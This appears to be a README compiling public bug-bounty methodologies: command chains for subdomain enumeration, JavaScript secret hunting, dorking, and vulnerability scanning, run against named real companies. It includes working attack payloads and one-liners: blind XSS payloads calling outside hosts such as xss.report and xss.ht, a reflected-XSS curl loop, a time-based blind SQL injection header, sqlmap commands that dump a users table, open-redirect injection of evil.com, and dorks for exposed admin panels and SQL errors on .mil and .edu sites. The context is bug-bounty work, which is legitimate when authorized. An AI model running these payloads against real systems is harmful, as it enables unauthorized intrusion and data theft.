# Bug-Hunting-methodologies
this repo contains some public methodologies which I found from internet (google,telegram,discord,writeups etc..) 

# Help to improve repo
If you found any methodologies please add a pull request so I can merge that and update the repo :D

# methodology number 1
```
subfinder -d viator.com -all  -recursive > subdomain.txt

cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"

cat allurls.txt | grep -E "\.js$" >> js.txt

cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ 

echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30

dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json

subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters

subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors

nuclei  -list ~/vaitor/subdomains_alive.txt -tags cves,osint,tech

cat allurls.txt | gf lfi | nuclei -tags lfi
cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
```

---

# methodology number 2 

- Source : [https://github.com/RemmyNine/BBH-Recon](https://github.com/RemmyNine/BBH-Recon)

- [Wide Recon](#WideRecon)
    - [Subdomain Enumerating](#Subdomain_Enumerating)
        - [Subfinder](https://github.com/projectdiscovery/subfinder) - GOAT, Config before you use it. Run it using `subfinder -dL target.txt -all -recursive -o output`
        - [BBot](https://github.com/blacklanternsecurity/bbot) - An alternative to subfinder.
        - [DNSDumpster](https://dnsdumpster.com/)
        - [crtSh Postgress DB](https://github.com/RemmyNine/Methodology/blob/main/crtsh.sh) -- Connect to pqdb and extract subdomains. Also manually use this website for some validations.
        - [AbuseIPDB](https://github.com/atxiii/small-tools-for-hunters/tree/main/abuse-ip) -- Use Atxii Script.
        - Favicon Hash -- Search the hash in Shodan --> Write a script to calculate the mm3 hash and search it in shodan.io
        - [Gau](https://github.com/lc/gau) --  `gau --subs example.com | unfurl -u domain | tee >> subs.txt`
        - [Waybackurls](https://github.com/tomnomnom/waybackurls) -- `echo domain.com | waybackurls | unfurl -u domains |‌ tee >> wbuRes.txt`
        - Host Header fuzzing on IP + URL.tld -> `fuf -w wordlist.txt -u "https://domaint.tld" -H "host: FUZZ" -H '### Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0`
        - PTR Record from IP
        - Scan ports 80, 443, and 8080 on the target IP address to discover new URLs.
        - Reverse DNS lookup
        - [Adtracker](https://github.com/dhn/udon) -- Use Udon, [BuiltWith](https://builtwith.com/) to use same Ad ID to search for similar domains/subdomains.
      - [DNS BureForce](#DnsBF)
          - [PureDNS](https://github.com/d3mondev/puredns) --> Do a static DNS bruteforce with multiple worldlist. Assetnote, all.txt by JHaddix and SecLists are good options.
          - [Gotator](https://github.com/Josue87/gotator) and [DNSGen](https://github.com/AlephNullSK/dnsgen) --> This gonna be a second-time/dynamic DNS bruteforce using permutation. *DO NOT SKIP THIS PART*
       
- [Asset Discovery](#AssetDiscovery)
    - Find ASNs + CIDRs + IP, NameServers --> PortScan + Reverse DNS Lookup
    - Unqiue Strings, Copyrights.
    - Find new assets on news, Stock market, Partners, about us.
    - Find new assets on crunchbase and similar websites.
    - Emails --> Reverse email lookup
    - MailServers + Certificate --> Reverse MX + SSL Search (For SSL use crtsh)
    - Search on different search engines (Google, Bing, Yandex)
    - Google Dorks (acquired by company, company. All Rights Reserved., © 2021 company. All Rights Reserved., company. All Rights Reserved." -inurl:company, acquired by target. target subsidiaries)
    - Search SSL on Shodan, FOFA and Censys.
    - Find same DMARC Information [DMARC Live](https://dmarc.live/info/yahoo.com)
 
 

 
----
# methodology number 3
- Description: This is a simple guide to perform **javascript recon** in the bugbounty
- Source: [https://gist.github.com/pikpikcu/b034a7e3b8bf966a6eba95acb1fbfe08](https://gist.github.com/pikpikcu/b034a7e3b8bf966a6eba95acb1fbfe08)

Steps
--

 - The first step is to collect possibly several javascript files (`more files` = `more paths,parameters` -> `more vulns`)
 
    To get more js files, this depends a lot on the target, I'm one who focuses a lot in large targets, it depends also a       lot on the tools that you use, I use a lot of my personal tools for this:
    
    __Tools:__
    
    
    gau  -  https://github.com/lc/gau  
    
    linkfinder -  https://github.com/GerbenJavado/LinkFinder
    
    getSrc - https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/getsrc.py 
    
    SecretFinder - https://github.com/m4ll0k/SecretFinder
    
    antiburl - https://github.com/tomnomnom/hacks/tree/master/anti-burl 
    
    antiburl.py - https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/antiburl.py
    
    ffuf - https://github.com/ffuf/ffuf
    
    allJsToJson.py (private tool)
    
    getJswords.py - https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/getjswords.py
    
    gitHubLinks.py (private tool)
    
    availableForPurchase.py - https://raw.githubusercontent.com/m4ll0k/Bug-Bounty-Toolz/master/availableForPurchase.py
    
    BurpSuite - http://portswigger.net/
    
    jsbeautify.py - https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/jsbeautify.py
    
    collector.py - https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/collector.py
    
    getScriptTagContent.py (private tool)
    
    jsAlert.py (private tool)
    
    
  
     __Description:__
     
     __gau__ - This tool is great, i usually use it to search for as many javascript files as possible, many companies host                their files on third parties, this thing is very for important for a bughunter because then really enumerate                a lot js files! 
               
        Example:
              
        paypal.com host their files on paypalobjects.com
        
        $ gau paypalobjects.com |grep -iE '\.js'|grep -ivE '\.json'|sort -u  >> paypalJS.txt
        $ gau paypal.com |grep -iE '\.js'|grep -ivE '\.json'|sort -u  >> paypalJS.txt
        
        don't worry if where the files are hosted is out-of-scope, our intent is to enumerate js files to get more           
        parameters,paths,tokens,apikey,..
       
     __linkfinder__ - This tool is great, i usually use it to search paths,links, combined with `availableForPurchase.py` and `collector.py` is awesome!
      ```
      Example:
      
      $ cat paypalJS.txt|xargs -n2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" >> paypalJSPathsWithUrl.txt 
      $ cat paypalJSPathsWithUrl.txt|grep -iv '[URL]:'||sort -u > paypalJSPathsNoUrl.txt
      $ cat paypalJSPathsNoUrl.txt | python3 collector.py output
      ```
     __getSrc__ - Tool to extract script links, the nice thing about this tool it make absolute url!
   
        
         Example:
   
        $ python3 getSrc.py https://www.paypal.com/
   
        https://www.paypalobjects.com/digitalassets/c/website/js/react-16_6_3-bundle.js
        https://www.paypalobjects.com/tagmgmt/bs-chunk.js
      
      __SecretFinder__ - Tool to discover sensitive data like apikeys, accesstoken, authorizations, jwt,..etc in js file
      
      ```
      Example:
      
      $ cat paypalJS.txt|xargs -n2 -I @ bash -c 'echo -e "\n[URL] @\n";python3 linkfinder.py -i @ -o cli' >> paypalJsSecrets.txt
      
      ```
      __antiburl/antiburl.py__ - Takes URLs on stdin, prints them to stdout if they return a 200 OK. antiburl.py is an  advanced version
      
      ```
      Example:
      
      $ cat paypalJS.txt|antiburl > paypalJSAlive.txt
      $ cat paypalJS.txt | python3 antiburl.py -A -X 404 -H 'header:value' 'header2:value2' -N -C "mycookies=10" -T 50 
      
      ```
      
      __ffuf__ - tool for fuzzing, I also use it for fuzzing js files
      
      ```
     
      Example:
      
      $ ffuf -u https://www.paypalobjects.com/js/ -w jsWordlist.txt -t 200 
      
      Note: top wordlists - https://wordlists.assetnote.io/
      ```
      
     __allJsToJson.py__ - it makes a request to the urls that are passed to it and retrieves all the js files and saves them to me in a json file.
     ```js
     
     $ cat myPaypalUrls.txt | python3 allJsToJson.py output.json
     $ cat output.json
     
     {
    "url_1": {
        "root": "www.paypal.com",
        "path": "/us/home",
        "url": "https://www.paypa.com/us/home",
        "count_js": "4",
        "results": {
            "script_1": "https://www.paypalobjects.com/web/res/dc9/99e63da7c23f04e84d0e82bce06b5/js/config.js",
            "content": "function()/**/"
        }
    },
    "url_2": {}
    }
     ```
     __gitHubLinks.py__ - find new links on GitHub, in this case only javascript links
   
     ```
      Example:
   
      $ python3 gitHubLinks.py www.paypalobjects.com|grep -iE '\.js'
      ```
     
     __availableForPurchase.py__ - this tools search if a domain is available to be purchase, this tool combined with linkfinder and collector is really powerful. Many times the developers for distraction mistake to write the domain, maybe the domain is importing an external javascript file ,...etc
     
     ```
     Example: 
     
     $ cat paypalJS.txt|xargs -I @ bash -c 'python3 linkfinder.py -i @ -o cli' | python3 collector.py output
     $ cat output/urls.txt | python3 availableForPurchase.py
     [NO]  www.googleapis.com 
     [YES] www.gooogleapis.com
     ```
    
    __BurpSuite__ - extract the content between the script tags, I usually use `getScriptTagContent.py`
    
    ![burp](https://i.imgur.com/8N3AOWF.png)
    
    after this save the content and use linkfinder 
    
    `$ python3 linkfinder.py -i burpscriptscontent.txt -o cli`
    
    
    __jsbeautify.py__ - Javascript Beautify 
    
    ```
    Example:
    
    $ python3 jsbeautify https://www.paypalobject.com/test.js paypal/manualAnalyzis.js
    
    ```
    
    __collector.py__ -  Split linkfinder stdout in jsfile,urls,params..etc
    
     ```
     $ python3 linkfinder.py -i https://www.test.com/a.js -o cli | python3 collector.py output
     $ ls output
     
     files.txt	js.txt		params.txt	paths.txt	urls.txt
     ```
     
    __jsAlert.py__ - notify if there are any interesting keywords, such as postMessage,onmessage,innerHTML,etc
    
    ```
    Example:
    
    $ cat myjslist.txt | python3 jsAlert.py
    
    [URL] https://..../test.js
    
    line:16 - innerHTML
    
    [URL] https://.../test1.js
    
    line:3223 - onmessage
    
    ```
     
    __getScriptTagContent.py__ - get content between script tags 
    
    ```
    Example:
    
    $ cat "https://www.google.com/"|python3 getScriptTagContent.py 
    
    function()/**/...
    ```
    
    __getJSWords.py__  - get all javascript file words excluding javascripts keywords
    
    ```
    Example:
    
    $ python3 getjswords.py https://www.google.com/test.js
    
    word
    word1
    ...
    ```
    
    As you see above we need a lot to do every time many requests, i solve this problem with allJsToJson, that keep me a contentof all js files and their content, obviously the tool is made on purpose to process only 5 urls at a time because of the size of the file, every time it process 5 urls save the output .. output1.json, output2.json,...
    

__Other Resources:__

- https://bhattsameer.github.io/2021/01/01/client-side-encryption-bypass-part-1.html
- https://developers.google.com/web/tools/chrome-devtools/javascript 
- https://www.youtube.com/watch?v=FTeE3OrTNoA&ab_channel=HackerOne

----



# methodology number 4
- Source : [https://github.com/WadQamar10/My-Hunting-Methodology-/tree/main](https://github.com/WadQamar10/My-Hunting-Methodology-/tree/main)

## Recon :-

- subfinder
```
subfinder -dL domains.txt -o subfinder.txt
subfinder -d inholland.nl -o subfinder.txt
```
- amass
```
go install -v github.com/OWASP/Amass/v3/...@master
amass enum -passive -norecursive -noalts -df domains.txt -o amass.txt
```
- crtfinder
```
python3 crtfinder.py -u alloyhome.com
```
- sublist3r
```
sublist3r -d safesavings.com -o sublist3r.txt
```
- Dork
```
- site:*.ibm.com -site:www.ibm.com
```

## Subdomain Takeover :-

1- Recon (live-subs.txt)
- Nuclei :-
```
- nuclei -t /root/nuclei-templates/takeovers/ -l live-subs.txt
```
- Subzy :-  https://github.com/LukaSikic/subzy
```
- subzy run --targets live-subs.txt
- subzy run --target test.google.com
- subzy run --target test.google.com,https://test.yahoo.com
```

## virtual Host scanner :-
```
- git clone https://github.com/jobertabma/virtual-host-discovery.git
- ruby scan.rb --ip=151.101.194.133 --host=cisco.com
```

## JS Hunting :-

```
- ﻿echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
- echo uber.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```
- JSS-Scanner :-
```
- echo "invisionapp.com" | waybackurls | grep -iE '\.js'|grep -ivE '\.json'|sort -u  > j.txt
- python3 JSScanner.py
```

## Shodan Dorking :-
```
- ssl.cert.subject.CN:"gevme.com*" 200
- ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"
- ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
- Set-Cookie:"mongo-express=" "200 OK"
- ssl:"invisionapp.com" http.title:"index of / "
- ssl:"arubanetworks.com" 200 http.title:"dashboard"
- net:192.168.43/24, 192.168.40/24
- AEM Login panel :-  git clone https://github.com/0ang3el/aem-hacker.git
```



## Collect all interisting ips from Shodan and save them in ips.txt
```
- cat ips.txt | httpx > live-ips.txt
- cat live_ips.txt | dirsearch --stdin
```


## Google dorking :-
```
- site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp
- intext:"index of /.git"
- site:*.*.edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
- site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com |
link:www.hackerone.com | link:www.slack.com | link:www.github.com
- inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)
- inurl:/geoserver/ows?service=wfs
```


## Github Dorking on live-subs.txt :-

- git-Grabber :
```
- python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo" -s

- python3 gitGraber.py -k wordlists/keywords.txt -q \"yahoo.com\" -s

- python3 gitGraber.py -k keywordsfile.txt -q \"yahoo.com\" -s -w mywordlist.txt
```


## XSS :-

- Paramspider :
```
- python3 paramspider.py --domain indrive.com
- python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output g.txt
- cat indrive.txt | kxss  ( looking for reflected :-  "<> )
```

## Looking for Hidden parameters :-
- Arjun :- 
```
- arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
- waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
- dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
- dalfox file urls.txt -b https://hahwul.xss.ht
- echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
- cat urls.txt | Gxss -c 100 -p XssReflected
```

## Sql Injection :-
```
- echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt
- cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt
- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
- sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
```

## SQLi One Linear :
```
- cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
```

## Dump-Data :-
```
- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
```

## SSTI :-

FOR Testing SSTI and tplmap tool :

```
- git clone https://github.com/epinna/tplmap.git

- ./tplmap.py -u "domain.com/?parameter=SSTI*"

- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php

- httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
```


## Testing for xss and sqli at the same time 

```
- cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt

- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt

- cat param.txt | kxss   
```

## Blind SQL Injection :-

Tips : `X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`


## Blind XSS :-

```
site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"
```

## Hunting For Cors Misconfigration :-

- https://github.com/chenjj/CORScanner

```
pip install corscanner

corscanner -i live_subdomains.txt -v -t 100

https://github.com/Tanmay-N/CORS-Scanner

go install github.com/Tanmay-N/CORS-Scanner@latest

cat CORS-domain.txt | CORS-Scanner
```

## Nmap Scanning :-
```
#- nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.

#- nmap -sS -p- -iL hosts.txt 

#- nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt


#- nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln

#- nmap -sT -p- 192.168.1.4    (Full Scan (TCP)).

#- nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).

#- nmap -sV 192.168.1.4 (Services Fingerprinting).

#- nmap 192.168.1.5 -O   (OS Fingerprinting).

#- nmap 192.168.1.0-255 -sn  (-sn) Live Hosts with me in network.

#- nmap -iL hosts.txt -sn


#- nc -nvz 192.168.1.4 1-65535  (Port Scanning Using nc).

#- nc -vn 34.66.209.2 22        (Services Fingerprinting).


#- netdiscover     (Devices On Network) (Layer2).

#- netdiscover -r 192.168.2.0/24  (Range).

#- netdiscover -p        (Passive).

#- netdiscover -l hosts.txt
```


## Running Nuclei :-

Scanning target domain with community-curated nuclei templates :-
```
- nuclei -u https://example.com

- nuclei -list urls.txt -t /fuzzing-templates

- nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml

- nuclei -u https://example.com -w workflows/
```

## Open Redirect:- 

Open Redirection OneLiner :-
```

- waybackurls tesorion.nl | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done

- httpx -l i.txt -path "///evil.com" -status-code -mc 302
```

-----
